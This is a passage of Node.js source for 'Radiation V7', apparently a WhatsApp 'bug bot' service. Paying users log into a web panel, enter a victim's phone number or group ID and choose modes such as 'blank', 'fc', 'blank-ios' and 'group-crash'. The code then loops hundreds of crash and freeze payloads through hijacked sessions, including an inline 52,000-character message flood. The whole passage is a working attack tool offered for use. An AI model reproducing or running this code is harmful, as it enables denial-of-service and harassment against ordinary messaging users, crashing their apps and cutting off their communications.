        await XzVDelay2(demmy, target);
        await sleep(5000);
        await XzVV2(demmy, target);
        await sleep(9000);
        await XzV(demmy, target);
        await sleep(9000);
        console.log(chalk.yellow(`[delay] ${i + 1}/99 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`[delay] ${i + 1} error: ${err.message}`));
      }
    }
    await sleep(2000);
  }
  console.log(chalk.blue(`[=] [delay] Done -> ${target}`));
}

async function GetSuInvis(target) {
  if (sessions.size === 0) { console.log(chalk.red("[x] [invis] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [invis] Starting -> ${target} with ${sessions.size} session(s)`));
  for (let i = 0; i < 5; i++) {
    if (sessions.size === 0) { console.log(chalk.red(`[x] [invis] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...sessions.values()]) {
      try {
        await FC1msg(demmy, target);
        await sleep(1000);
        console.log(chalk.yellow(`[invis] ${i + 1}/999 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`[invis] ${i + 1} error: ${err.message}`));
      }
    }
  }
  console.log(chalk.blue(`[=] [invis] Done -> ${target}`));
}

async function GetSuBlankAndro(target) {
  if (sessions.size === 0) { console.log(chalk.red("[x] [blank] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [blank] Starting -> ${target} with ${sessions.size} session(s)`));
  for (let i = 0; i < 999; i++) {
    if (sessions.size === 0) { console.log(chalk.red(`[x] [blank] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...sessions.values()]) {
      try {
        await XFreeze(demmy, target);
        await sleep(5000);
        await ZyySpammerBlank(demmy, target);
        console.log(chalk.yellow(`  [blank] done -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [blank] error: ${err.message}`));
      }
    }
  }
  console.log(chalk.blue(`[=] [blank] Done -> ${target}`));
}

async function GetSuBlankIOS(target) {
  if (sessions.size === 0) { console.log(chalk.red("[x] [blank-ios] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [blank-ios] Starting -> ${target} with ${sessions.size} session(s)`));
  for (let i = 0; i < 999; i++) {
    if (sessions.size === 0) { console.log(chalk.red(`[x] [blank-ios] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...sessions.values()]) {
      try {
        await ForcloseIos(demmy, target);
        await sleep(3500);
        console.log(chalk.yellow(`  [blank-ios] ${i + 1}/5 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [blank-ios] ${i + 1} error: ${err.message}`));
      }
    }
  }
  console.log(chalk.blue(`[=] [blank-ios] Done -> ${target}`));
}

async function GetSuFC(target) {
  if (sessions.size === 0) { console.log(chalk.red("[x] [fc] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [fc] Starting -> ${target} with ${sessions.size} session(s)`));
  for (let i = 0; i < 700; i++) {
    if (sessions.size === 0) { console.log(chalk.red(`[x] [fc] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...sessions.values()]) {
      try {
        await XzVDelay2(demmy, target);
        await sleep(7000);
        await XzVV2(demmy, target);
        await sleep(7000);
        await XzV(demmy, target);
        console.log(chalk.yellow(`  [fc] ${i + 1}/700 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [fc] ${i + 1} error: ${err.message}`));
      }
    }
    await sleep(6000);
  }
  console.log(chalk.blue(`[=] [fc] Done -> ${target}`));
}

async function GetSuGroupDelay(target) {
  if (sessions.size === 0) { console.log(chalk.red("[x] [group-delay] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [group-delay] Starting -> ${target} with ${sessions.size} session(s)`));
  for (let i = 0; i < 200; i++) {
    if (sessions.size === 0) { console.log(chalk.red(`[x] [group-delay] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...sessions.values()]) {
      try {
        await demmy.relayMessage(target, {
          extendedTextMessage: {
            text: "飞慧慧明" + "".repeat(52000),
            contextInfo: { mentionedJid: ["0@s.whatsapp.net"] }
          }
        }, { participant: { jid: target } });
        console.log(chalk.yellow(`  [group-delay] ${i + 1}/200 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [group-delay] ${i + 1} error: ${err.message}`));
      }
    }
    await sleep(2000);
  }
  console.log(chalk.blue(`[=] [group-delay] Done -> ${target}`));
}

async function GetSuGroupBlank(target) {
  if (sessions.size === 0) { 
    console.log(chalk.red("[x] [group-blank] No active sessions.")); 
    return; 
  }
  
  console.log(chalk.cyan(`[>] [group-blank] Starting -> ${target} with ${sessions.size} session(s)`));
  
  for (let i = 0; i < 999; i++) {
    if (sessions.size === 0) { 
      console.log(chalk.red(`[x] [group-blank] Session lost at ${i + 1}, stopping.`)); 
      break; 
    }
    
    for (const demmy of [...sessions.values()]) {
      try {
        await XFreeze(demmy, target);
        await sleep(3000);
        await ZyySpammerBlank(demmy, target);
        await sleep(3000);
        await ForcloseIos(demmy, target);
        console.log(chalk.yellow(`  [group-blank] done -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [group-blank] error: ${err.message}`));
      }
    }
    await sleep(700);
  }
  
  console.log(chalk.blue(`[=] [group-blank] Done -> ${target}`));
}
async function GetSuGroupCrash(target) {
  if (sessions.size === 0) { console.log(chalk.red("[x] [group-invis] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [group-invis] Starting -> ${target} with ${sessions.size} session(s)`));
  for (let i = 0; i < 1000; i++) {
    if (sessions.size === 0) { console.log(chalk.red(`[x] [group-invis] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...sessions.values()]) {
      try {
        await invigccrash(demmy, target);
        await sleep(6000);
        await ForcloseIos(demmy, target);
        console.log(chalk.yellow(`  [group-invis] ${i + 1}/1000 -> ${target}`));
      } catch (err) {
        console.error(chalk.red(`  [group-invis] ${i + 1} error: ${err.message}`));
      }
    }
    await sleep(700);
  }
  console.log(chalk.blue(`[=] [group-invis] Done -> ${target}`));
}

const BUG_MODES = {
  "delay":        GetSuDelay,
  "invis":        GetSuInvis,
  "blank":        GetSuBlankAndro,
  "blank-ios":    GetSuBlankIOS,
  "fc":           GetSuFC,
  "group-delay":  GetSuGroupDelay,
  "group-blank":  GetSuGroupBlank,
  "group-invis":  GetSuGroupCrash,
  "group-ban":    async (target) => {
    if (sessions.size === 0) throw new Error("No active WhatsApp sessions.");
    await groupBanz(target);
  }
};

function fireBug(mode, target) {
  const fn = BUG_MODES[mode];
  if (!fn) throw new Error(`Unknown mode: ${mode}`);
  fn(target).catch(err => console.error(`[x] fireBug(${mode}) error: ${err.message}`));
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());

function requireAuth(req, res, next) {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const users = getUsers();
  const user  = users.find(u => u.username === username);
  if (!user)  return res.status(401).json({ ok: false, error: "Unauthorized" });
  if (user.expired && Date.now() > user.expired)
    return res.status(403).json({ ok: false, error: "Session expired. Please log in again." });
  req.authUser = user;
  next();
}

app.get("/", (req, res) => {
  const fp = path.join(__dirname, "Database", "AppsVerse", "Login.html");
  fs.readFile(fp, "utf8", (err, html) => {
    if (err) return res.status(500).send("[x] Failed to read Login.html");
    const banner = getBannerDataURI("Database/Assets/login_logo.jpg", "image/jpeg");
    res.send(html.replace(/\{\{bannerUrl\}\}/g, banner));
  });
});

app.get("/login", (req, res) => {
  const fp = path.join(__dirname, "Database", "AppsVerse", "Login.html");
  fs.readFile(fp, "utf8", (err, html) => {
    if (err) return res.status(500).send("[x] Failed to read Login.html");
    const banner = getBannerDataURI("Database/Assets/login_logo.jpg", "image/jpeg");
    res.send(html.replace(/\{\{bannerUrl\}\}/g, banner));
  });
});

app.post("/auth", (req, res) => {
  const { username, key, password } = req.body;
  const loginKey = key || password;
  if (!username || !loginKey)
    return res.redirect("/login?msg=" + encodeURIComponent("Please fill in all fields.") + "&type=error");
  const users = getUsers();
  const user  = users.find(u => u.username === username && u.key === loginKey);
  if (!user)
    return res.redirect("/login?msg=" + encodeURIComponent("Invalid username or key.") + "&type=error");
  if (user.expired && Date.now() > user.expired)
    return res.redirect("/login?msg=" + encodeURIComponent("Your key has expired. Please contact admin.") + "&type=error");
  res.cookie("sessionUser", username, { maxAge: 3600000, httpOnly: true });
  res.cookie("sessionKey",  key,      { maxAge: 3600000, httpOnly: true });
  res.redirect("/execution");
});

const executionPage = (status = "<i class='fas fa-circle'></i> Ready", detail = {}, isForm = true, userInfo = {}, userKey = "", mode = "") => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("en-NG", { timeZone: "Africa/Lagos", year: "2-digit", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit" })
    : "-";
  const fp = path.join(__dirname, "Database", "AppsVerse", "Dashboard.html");
  try {
    let html = fs.readFileSync(fp, "utf8");
    html = html
      .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g,   userKey || "Unknown")
      .replace(/\$\{userKey\}/g,                       userKey || "")
      .replace(/\$\{password\}/g,                      userKey || "")
      .replace(/\{\{password\}\}/g,                    userKey || "")
      .replace(/\{\{key\}\}/g,                         userKey || "")
      .replace(/\$\{key\}/g,                           userKey || "")
      .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g,   username || "Unknown")
      .replace(/\$\{username\}/g,                      username || "Unknown")
      .replace(/\{\{username\}\}/g,                    username || "Unknown")
      .replace(/\{\{expired\}\}/g,                     formattedTime)
      .replace(/\{\{status\}\}/g,                      status)
      .replace(/\$\{formattedTime\}/g,                 formattedTime)
      .replace(/\{\{bannerUrl\}\}/g, getBannerDataURI("Database/Assets/dashboard_banner.png", "image/png"));
    return html;
  } catch (err) {
    console.error("Failed to read Dashboard.html:", err);
    return `<h1>${BOT_NAME} — ${status}</h1><p>${detail.message || ""}</p>`;
  }
};

app.get("/api/check-device", async (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });

  const number = (req.query.number || "").replace(/\D/g, "");
  if (!number) return res.status(400).json({ ok: false, error: "Missing number" });
  if (sessions.size === 0) return res.status(503).json({ ok: false, error: "No active WhatsApp session." });

  const getDevice = (msgKeyId) => {
    if (!msgKeyId) return "Unknown";
    if (msgKeyId.startsWith("AC")) return "Android";
    if (msgKeyId.substring(0, 2) === "3A") return "iPhone";
    return "WhatsApp Web / Bot";
  };

  try {
    const sock = getActiveSock();
    const jid  = `${number}@s.whatsapp.net`;

    const onWA = await sock.onWhatsApp(number);
    if (!onWA || !onWA.length || !onWA[0].exists)
      return res.json({ ok: true, exists: false, number });

    const isBiz = !!(onWA[0].verifiedBizName || onWA[0].isBusiness);

    let platform = "Unknown";
    let deviceCount = 1;

    try {
      const msgs = await sock.fetchMessagesFromWA(jid, 1);
      const lastMsg = msgs?.[0];
      const keyId = lastMsg?.key?.id || "";
      platform = getDevice(keyId);
      if (isBiz) platform = platform.replace("Android", "Android (Business)").replace("iPhone", "iPhone (Business)");
    } catch {
      try {
        await sock.sendPresenceUpdate("available", jid);
        platform = isBiz ? "WhatsApp Business" : "Android";
      } catch {
        platform = isBiz ? "WhatsApp Business" : "Android";
      }
    }

    return res.json({ ok: true, exists: true, number, jid, platform, devices: deviceCount });

  } catch (err) {
    return res.status(500).json({ ok: false, error: err.message });
  }
});

app.get("/api/group-jid", async (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });

  const link = (req.query.link || "").trim();
  if (!link) return res.status(400).json({ ok: false, error: "Missing link" });
  if (sessions.size === 0) return res.status(503).json({ ok: false, error: "No active WhatsApp session." });

  try {
    const sock = getActiveSock();
    const code = link.includes("chat.whatsapp.com/")
      ? link.split("chat.whatsapp.com/").pop().split(/[?#]/)[0].trim()
      : link.trim();

    if (!code) return res.status(400).json({ ok: false, error: "Invalid invite link." });

    const info = await sock.groupGetInviteInfo(code);

    return res.json({
      ok:          true,
      groupId:     info.id,
      name:        info.subject  || "Unknown",
      description: info.desc     || "",
      size:        info.size     || 0,
      creation:    info.creation ? new Date(info.creation * 1000).toLocaleDateString("en-GB") : "—",
    });
  } catch (err) {
    console.error("[group-jid]", err.message);
    const msg = err.message.includes("not-authorized") || err.message.includes("403")
      ? "Bot is not in this group or invite is invalid."
      : err.message.includes("invalid") ? "Invalid invite link." : err.message;
    return res.status(500).json({ ok: false, error: msg });
  }
});

app.get("/execution", (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const loginPage = () => {
      const fp = path.join(__dirname, "Database", "AppsVerse", "Login.html");
      if (!fs.existsSync(fp)) return res.status(500).send("Login page not found.");
      const banner = getBannerDataURI("Database/Assets/login_logo.jpg", "image/jpeg");
      res.send(fs.readFileSync(fp, "utf8").replace(/\{\{bannerUrl\}\}/g, banner));
    };
    if (!username) return loginPage();

    const users       = getUsers();
    const currentUser = users.find(u => u.username === username);
    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) return loginPage();

    const now          = Date.now();
    const targetNumber = req.query.target;
    const mode         = req.query.mode;
    const targetType   = req.query.type || "private";
    const target       = targetNumber
      ? targetType === "group"
        ? `${targetNumber}@g.us`
        : `${targetNumber}@s.whatsapp.net`
      : null;

    if (!targetNumber) {
      const status = sessions.size > 0
        ? "<i class='fas fa-circle-check'></i> Server Online"
        : "<i class='fas fa-spinner fa-spin'></i> Waiting for session...";
      const msg = sessions.size > 0
        ? (mode ? `Enter target ${targetType === "group" ? "group ID" : "number"} (62xxxxxxxxxx).` : "Choose a mode.")
        : "Paired successfully — session is connecting. Please wait a moment then try your command.";
      return res.send(executionPage(status, { message: msg }, true, currentUser, currentUser.key || "", mode || ""));
    }

    if (sessions.size === 0 && targetNumber) {
      return res.status(503).json({ ok: false, error: "No active WhatsApp session. Please contact admin.", code: "NO_SESSION" });
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("<i class='fas fa-circle-xmark'></i> Invalid Format", { target: targetNumber, message: "Must be digits only, starting with country code." }, true, currentUser, currentUser.key || "", mode));
    }

    try {
      if (!BUG_MODES[mode]) throw new Error(`Unknown mode: ${mode}`);
      if (sessions.size === 0) return res.status(503).json({ ok: false, error: "No active WhatsApp session. Add a bot first.", code: "NO_SESSION" });

      fireBug(mode, target);
      console.log(`[EXEC] User: ${username} | Target: ${targetNumber} (${targetType}) | Mode: ${mode} | ${new Date().toLocaleString("en-NG")}`);

      return res.json({ ok: true, target: targetNumber, type: targetType, mode, timestamp: new Date().toLocaleString("en-NG"), message: `Mode: ${mode.toUpperCase()} — Radiation V7` });
    } catch (err) {
      return res.status(500).json({ ok: false, error: err.message || "An error occurred.", code: "EXEC_ERROR" });
    }
  } catch (err) {
    console.error("Fatal /execution error:", err);
    return res.status(500).send("Internal Server Error");
  }
});

app.get("/api/profile", (req, res) => {
  try {
    const username = req.cookies?.sessionUser;
    if (!username) return res.status(401).json({ error: "Unauthorized" });
    const users = getUsers();
    const user  = users.find(u => u.username === username);
    if (!user)   return res.status(401).json({ error: "Unauthorized" });

    const now     = Date.now();
    const expired = user.expired || null;
    const active  = expired ? now < expired : true;

    let expiryStr = "Lifetime";
    if (expired) expiryStr = new Date(expired).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" });

    let sinceStr = "—";
    if (user.createdAt) sinceStr = new Date(user.createdAt).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" });

    res.json({ username: user.username, role: user.role || "Member", key: user.key, createdBy: user.createdBy || "admin", expiry: expiryStr, since: sinceStr, active, sessionCount: sessions.size });
  } catch {
    res.status(500).json({ error: "Internal error" });
  }
});

app.get("/api/stats", (req, res) => {
  try {
    const username = req.cookies?.sessionUser;
    if (!username) return res.status(401).json({ error: "Unauthorized" });
    const users       = getUsers();
    const currentUser = users.find(u => u.username === username);
    if (!currentUser) return res.status(401).json({ error: "Unauthorized" });

    res.json({
      activeSenders: sessions.size,
      totalKeys:     users.length,
      onlineUsers:   users.filter(u => u.expired && Date.now() < u.expired).length,
      botOnline:     sessions.size > 0,
      sessions:      sessions.size,
    });
  } catch {
    res.status(500).json({ error: "Internal error" });
  }
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.clearCookie("sessionKey");
  res.redirect("/login");
});

app.get("/api/pair/code", async (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const number = (req.query.number || "").replace(/\D/g, "");
  if (!number || number.length < 7 || number.length > 15)
    return res.status(400).json({ ok: false, error: "Invalid number. Use international format e.g. 234xxxxxxxxxx" });
  if (sessions.has(number))
    return res.status(409).json({ ok: false, error: `${number} is already connected.` });

  if (pendingCodes.has(number)) {
    pendingCodes.get(number).reject(new Error("Superseded by new request."));
    pendingCodes.delete(number);
  }

  try {
    delActive(number);
    wipeDir(number);

    const codePromise = new Promise((resolve, reject) => {
      pendingCodes.set(number, { resolve, reject });
      setTimeout(() => {
        if (pendingCodes.has(number)) {
          pendingCodes.get(number).reject(new Error("Pairing timed out. Try again."));
          pendingCodes.delete(number);
        }
      }, 20000);
    });

    createWAConnection(number).catch(() => {});

    const code = await codePromise;
    return res.json({ ok: true, code, number });
  } catch (err) {
    return res.status(500).json({ ok: false, error: err.message });
  }
});

app.get("/api/pair/wait/:number", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const number = (req.params.number || "").replace(/\D/g, "");
  if (!number) return res.status(400).json({ ok: false, error: "Missing number" });

  if (sessions.has(number))
    return res.json({ ok: true, connected: true, number });

  const timeout = setTimeout(() => {
    if (pendingSessions.has(number)) {
      pendingSessions.delete(number);
      res.json({ ok: true, connected: false, number, reason: "timeout" });
    }
  }, 90000);

  pendingSessions.set(number, (connected) => {
    clearTimeout(timeout);
    res.json({ ok: true, connected, number });
  });

  req.on("close", () => {
    clearTimeout(timeout);
    pendingSessions.delete(number);
  });
});

app.get("/api/pair/status/:number", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const number = (req.params.number || "").replace(/\D/g, "");
  if (!number) return res.status(400).json({ ok: false, error: "Missing number" });
  return res.json({ ok: true, connected: sessions.has(number), number, total: sessions.size });
});

app.get("/api/pair/list", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const list = [...sessions.keys()].map(num => ({
    number: num,
    status: "connected",
    connected: true,
  }));
  res.json({ ok: true, sessions: list, total: list.length });
});

app.delete("/api/pair/delete", async (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const number = (req.query.number || "").replace(/\D/g, "");
  if (!number) return res.status(400).json({ ok: false, error: "Missing number" });
  try {
    if (reconnectTimers.has(number)) {
      clearTimeout(reconnectTimers.get(number));
      reconnectTimers.delete(number);
    }
    if (sessions.has(number)) {
      try { sessions.get(number).end(); } catch {}
      sessions.delete(number);
    }
    delActive(number);
    wipeDir(number);
    res.json({ ok: true, message: `Session ${number} removed.` });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.get("/api/sessions", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const list = [...sessions.keys()].map(num => ({ number: num, connected: true }));
  res.json({ ok: true, sessions: list, total: list.length });
});

app.delete("/api/sessions/:number", async (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const number = (req.params.number || "").replace(/\D/g, "");
  if (!number) return res.status(400).json({ ok: false, error: "Missing number" });
  try {
    if (reconnectTimers.has(number)) {
      clearTimeout(reconnectTimers.get(number));
      reconnectTimers.delete(number);
    }
    if (sessions.has(number)) {
      try { sessions.get(number).end(); } catch {}
      sessions.delete(number);
    }
    delActive(number);
    wipeDir(number);
    res.json({ ok: true, message: `Session ${number} removed.` });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.get("/api/users", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const users = getUsers();
  const now   = Date.now();
  const list  = users.map(u => ({
    username:  u.username,
    role:      u.role || "Member",
    key:       u.key,
    expired:   u.expired || null,
    active:    u.expired ? now < u.expired : true,
    banned:    u.banned  || false,
    createdBy: u.createdBy || "owner",
    createdAt: u.createdAt || null,
  }));
  res.json({ ok: true, users: list, total: list.length });
});

app.post("/api/users/role", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const callerUsers = getUsers();
  const caller = callerUsers.find(u => u.username === username);
  if (!caller) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const callerRole = (caller.role || "Member").toLowerCase();
  if (!["owner", "admin"].includes(callerRole) && !isOwner(caller.createdBy || ""))
    return res.status(403).json({ ok: false, error: "No permission to change roles." });
  const { username: target, role } = req.body;
  if (!target || !role) return res.status(400).json({ ok: false, error: "Missing username or role" });
  const validRoles = ["Owner", "Admin", "Reseller", "Moderator", "Member"];
  const normalized = role.charAt(0).toUpperCase() + role.slice(1).toLowerCase();
  if (!validRoles.includes(normalized))
    return res.status(400).json({ ok: false, error: `Invalid role. Valid: ${validRoles.join(", ")}` });
  const users = getUsers();
  const idx   = users.findIndex(u => u.username === target);
  if (idx === -1) return res.status(404).json({ ok: false, error: "User not found." });
  users[idx].role = normalized;
  saveUsers(users);
  res.json({ ok: true, username: target, role: normalized });
});

app.post("/api/users/ban", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const { username: target, unban } = req.body;
  if (!target) return res.status(400).json({ ok: false, error: "Missing username" });
  const users = getUsers();
  const idx   = users.findIndex(u => u.username === target);
  if (idx === -1) return res.status(404).json({ ok: false, error: "User not found." });
  users[idx].banned = !unban;
  saveUsers(users);
  res.json({ ok: true, username: target, banned: !unban });
});

app.delete("/api/users/delete", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const { username: target } = req.body;
  if (!target) return res.status(400).json({ ok: false, error: "Missing username" });
  const users = getUsers();
  const idx   = users.findIndex(u => u.username === target);
  if (idx === -1) return res.status(404).json({ ok: false, error: "User not found." });
  users.splice(idx, 1);
  saveUsers(users);
  res.json({ ok: true, username: target });
});

app.post("/api/users/reset-password", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const { username: target } = req.body;
  if (!target) return res.status(400).json({ ok: false, error: "Missing username" });
  const users = getUsers();
  const idx   = users.findIndex(u => u.username === target);
  if (idx === -1) return res.status(404).json({ ok: false, error: "User not found." });
  const tempPassword = generateKey(4);
  users[idx].key = tempPassword;
  saveUsers(users);
  res.json({ ok: true, username: target, tempPassword });
});

app.post("/api/change-password", (req, res) => {
  const username = req.cookies?.sessionUser;
  if (!username) return res.status(401).json({ ok: false, error: "Unauthorized" });
  const { oldPassword, current, newPassword } = req.body;
  const oldPw = oldPassword || current;
  if (!oldPw || !newPassword)
    return res.status(400).json({ ok: false, error: "Missing old or new password" });
  const users = getUsers();
  const idx   = users.findIndex(u => u.username === username);
  if (idx === -1) return res.status(401).json({ ok: false, error: "Unauthorized" });
  if (users[idx].key !== oldPw)
    return res.status(403).json({ ok: false, error: "Old password is incorrect." });
  users[idx].key = newPassword;
  saveUsers(users);
  res.json({ ok: true, message: "Password changed successfully." });
});

console.clear();
bot.launch();

console.log(chalk.hex("#C8874A")(`
╔══════════════════════════════════╗
║        RADIATION V7 ONLINE       ║
╠══════════════════════════════════╣
║  Creator : Demmy Tech            ║
║  Version : ${BOT_VERSION}                  ║
║  Status  : Connected [OK]        ║
╚══════════════════════════════════╝`));

initializeWhatsAppConnections();

app.listen(PORT || 3000, () => {
  console.log(chalk.green(`[+] Web server running on port ${PORT || 3000}`));
});

process.once("SIGINT",  () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));

// Per-label cooldown: same label+message fingerprint is suppressed for COOLDOWN_MS.
// Critical process events (uncaughtException) bypass the cooldown — those always fire.
const _notifyError = (() => {
  const COOLDOWN_MS = 15000;
  const _seen = new Map(); // label -> { fingerprint, ts }

  return async (label, err, { force = false } = {}) => {
    const errObj  = err instanceof Error ? err : new Error(String(err));
    const message = errObj.message || String(errObj);
    const fingerprint = `${label}::${message}`;
    const now = Date.now();

    const prior = _seen.get(label);
    if (!force && prior && prior.fingerprint === fingerprint && now - prior.ts < COOLDOWN_MS) return;
    _seen.set(label, { fingerprint, ts: now });

    const stack = errObj.stack
      ? errObj.stack.split("\n").slice(1, 4).join("\n").trim()
      : "";

    console.error(chalk.red(`[x] ${label}: ${message}`));
    if (stack) console.error(chalk.gray(stack));

    const stackLine = stack ? `\n\n<b>Stack:</b>\n<pre>${stack.slice(0, 400)}</pre>` : "";
    const tgText =
      `<b>⚠️ ${BOT_NAME} — Error</b>\n` +
      `<b>Label:</b> <code>${label}</code>\n` +
      `<b>Message:</b> <pre>${message.slice(0, 600)}</pre>` +
      stackLine;

    try {
      await bot.telegram.sendMessage(OwnerId, tgText, { parse_mode: "HTML" });
    } catch {}
  };
})();

process.on("uncaughtException", (err) => {
  _notifyError("uncaughtException", err, { force: true });
});

process.on("unhandledRejection", (reason) => {
  const err = reason instanceof Error ? reason : new Error(String(reason));
  _notifyError("unhandledRejection", err);
});

app.use((err, req, res, next) => {
  _notifyError(`Express [${req.method} ${req.path}]`, err);
  if (!res.headersSent) res.status(500).json({ ok: false, error: "Internal server error." });
});

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized, saveUsers, getUsers };
